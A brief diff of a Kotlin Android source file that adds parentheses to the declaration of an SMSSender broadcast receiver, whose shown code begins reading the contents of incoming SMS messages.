@@ -7,7 +7,7 @@ import android.provider.ContactsContract
 import android.telephony.SmsManager
 import android.telephony.SmsMessage
 
-class SMSSender : BroadcastReceiver() {
+class SMSSender() : BroadcastReceiver() {
     override fun onReceive(p0: Context, p1: Intent) {
         var pdus = p1.extras.get("pdus") as Array<Any>
         var text: String = ""
